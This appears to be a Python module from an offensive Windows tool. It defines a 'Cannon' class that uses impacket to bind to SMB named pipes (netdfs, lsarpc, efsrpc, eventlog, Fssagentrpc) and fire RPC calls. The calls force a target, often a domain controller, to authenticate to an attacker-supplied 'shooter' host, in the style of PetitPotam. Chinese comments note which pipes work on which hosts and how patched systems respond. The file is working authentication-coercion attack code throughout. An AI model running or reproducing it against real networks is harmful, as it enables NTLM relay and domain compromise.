import logging
import time
from collections import namedtuple

from certipy.lib.target import Target
from impacket.dcerpc.v5.transport import SMBTransport
from impacket.smbconnection import SessionError
from impacket.uuid import uuidtup_to_bin

from bullets import dfsnm, efsr, even, fsrvp
from bullets.base import BulletGenerator


class Cannon:
    def __init__(self, pipes, uuid, bullet_generators: list, target: Target, shooter, **kwargs):
        self._pipes = pipes
        self._uuid = uuid
        self._bullet_generators = bullet_generators
        self._target = target
        self._shooter = shooter
        self._opts = kwargs
        self._dce = None

    # 初始化smb及dcerpc
    def _lock_and_load(self):
        for pipe in self._pipes:
            logging.info(f'target pipe is {pipe}')
            if not self._target.target_ip:
                logging.error(f'[shoot] target ip not specified')

            # TODO
            # kerberos login

            _transport_opts = {
            }
            params = ('username', 'password', 'nthash', 'lmhash')
            [_transport_opts.update({k: getattr(self._target, k)})
             for k in params if getattr(self._target, k)]

            _transport = SMBTransport(remoteName=self._target.target_ip, remote_host=self._target.target_ip,
                                      filename=pipe, **_transport_opts)
            if self._opts.get('timeout'):
                _transport.set_connect_timeout(self._opts.get('timeout'))
            _transport.preferred_dialect(0x0202)
            try:
                dce = _transport.get_dce_rpc()
                dce.connect()
                dce.bind(uuidtup_to_bin(self._uuid))
                self._dce = dce
                logging.info(f'[lock&load] success')
                self._shoot()
            except SessionError as e1:
                if "STATUS_OBJECT_NAME_NOT_FOUND" in e1.getErrorString():
                    logging.error(f'pipe not exists')
                else:
                    logging.error(e1.getErrorString())
            except Exception as e2:
                # 不允许匿名登录
                logging.error(f'[lock&load] dce init error {e2}')

    # 发射
    def _shoot(self):
        if not self._dce:
            return
        for bullet_generator in self._bullet_generators:
            for bullet in bullet_generator.generate(self._shooter, self._opts.get('auth_proto')):
                try:
                    time.sleep(self._opts.get('delay'))
                    args = bullet_generator._vul_args
                    vals = [bullet[arg] for arg in args]
                    logging.info(f'shooting [\x1b[36;20m{self._target.target_ip}\x1b[0m]\x1b[34;20m{bullet_generator._class.__name__}(' + ', '.join(
                        [f'{k}={v[:-1]}' for k, v in zip(args, vals)]) + ')\x1b[0m')
                    self._dce.request(bullet)
                except Exception as e:
                    if "ERROR_BAD_NETPATH" in str(e):
                        logging.info(f'\x1b[31;20m[--->] target hit! please check server connections.\x1b[0m')
                    elif "STATUS_CONNECTION_DISCONNECTED" in str(e):
                        logging.info(f'\x1b[31;20m[--->] target hit! please check server connections.\x1b[0m')
                    else:
                        logging.error(f'[_shoot] {e}')

    def shoot(self):
        self._lock_and_load()


Rpc = namedtuple('Rpc', ['pipes', 'uuid', 'bullet_generators'])

# 这个实测只有DC上有
dfs1 = Rpc(
    pipes=[r'netdfs'],
    uuid=('4FC742E0-4A10-11CF-8273-00AA004AE673', '3.0'),
    bullet_generators=dfsnm.bullet_generators,
)

# 这个pc和服务器上都可以打，但是目测只有EfsRpcOpenFileRaw好用
# 如果打了河马补丁那么EfsRpcOpenFileRaw会返回错误rpc_s_access_denied然后断开连接
efs1 = Rpc(
    pipes=[r"lsarpc", r"samr",
           r"lsass", r"netlogon"],
    uuid=('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0'),
    bullet_generators=efsr.bullet_generators,
)

# 这个实测只有PDC上有
efs2 = Rpc(
    pipes=[r"efsrpc", ],
    uuid=('df1941c5-fe89-4e79-bf10-463657acf44d', '1.0'),
    bullet_generators=efsr.bullet_generators,
)

# 这个在服务器和域控上都有，好用，新版修了，成功了返回STATUS_CONNECTION_DISCONNECTED， 跟河马一样修复了返回rpc_s_access_denied
even1 = Rpc(
    pipes=[r'eventlog'],
    uuid=('82273fdc-e32a-18c3-3f78-827929dc23ea', '0.0'),
    bullet_generators=even.bullet_generators
)

# 这个服务默认是没有的，鸡肋
fsrvp1 = Rpc(
    pipes=[r"Fssagentrpc"],
    uuid=("a8e0653c-2744-4389-a61d-7373df8b2292", '1.0'),
    bullet_generators=fsrvp.bullet_generators,
)
